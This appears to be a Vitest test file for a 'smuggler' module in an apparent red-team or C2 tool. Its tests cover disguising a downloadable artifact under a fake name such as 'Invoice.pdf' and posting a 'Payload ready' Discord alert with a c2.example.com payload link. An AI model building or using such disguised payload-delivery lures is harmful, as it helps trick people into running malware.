import { describe, it, expect, vi, beforeEach } from 'vitest'
import * as clientModule from '../client'

vi.mock('../client', () => ({
  client: {
    post: vi.fn(),
  },
}))

const mockFetch = vi.fn()
vi.stubGlobal('fetch', mockFetch)

const mockedClient = clientModule.client as any

describe('smuggler API', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockFetch.mockResolvedValue({ ok: true })
  })

  it('createSmugLink posts to /v1/smug with correct body', async () => {
    mockedClient.post.mockResolvedValue({
      data: { link_id: 'abc123def456abc123def456abc123de', url: '/d/abc123def456abc123def456abc123de/Invoice.pdf' },
    })
    const { createSmugLink } = await import('../smuggler')
    const res = await createSmugLink('artifact-uuid-123', 'Invoice.pdf')
    expect(mockedClient.post).toHaveBeenCalledWith('/v1/smug', {
      download_id: 'artifact-uuid-123',
      fake_name:   'Invoice.pdf',
    })
    expect(res.link_id).toBe('abc123def456abc123def456abc123de')
    expect(res.url).toBe('/d/abc123def456abc123def456abc123de/Invoice.pdf')
  })

  it('createSmugLink returns SmugResponse data', async () => {
    mockedClient.post.mockResolvedValue({
      data: { link_id: 'deadbeef00000000deadbeef00000000', url: '/d/deadbeef00000000deadbeef00000000/file.pdf' },
    })
    const { createSmugLink } = await import('../smuggler')
    const res = await createSmugLink('some-id', 'file.pdf')
    expect(res).toEqual({
      link_id: 'deadbeef00000000deadbeef00000000',
      url:     '/d/deadbeef00000000deadbeef00000000/file.pdf',
    })
  })

  it('sendDiscordWebhook posts to webhook URL with embeds payload', async () => {
    const { sendDiscordWebhook } = await import('../smuggler')
    await sendDiscordWebhook(
      'https://discord.com/api/webhooks/123/abc',
      'https://c2.example.com/d/abc/Invoice.pdf',
      'Invoice.pdf',
    )
    expect(mockFetch).toHaveBeenCalledWith(
      'https://discord.com/api/webhooks/123/abc',
      expect.objectContaining({
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    expect.stringContaining('Invoice.pdf'),
      }),
    )
    const body = JSON.parse(mockFetch.mock.calls[0][1].body)
    expect(body.embeds[0].title).toBe('Payload ready')
    expect(body.embeds[0].fields[0].value).toContain('Invoice.pdf')
    expect(body.embeds[0].fields[1].value).toBe('https://c2.example.com/d/abc/Invoice.pdf')
  })

  it('sendDiscordWebhook throws on non-ok response', async () => {
    mockFetch.mockResolvedValue({ ok: false, status: 429 })
    const { sendDiscordWebhook } = await import('../smuggler')
    await expect(
      sendDiscordWebhook('https://discord.com/api/webhooks/123/abc', 'https://...', 'file.pdf')
    ).rejects.toThrow()
  })
})
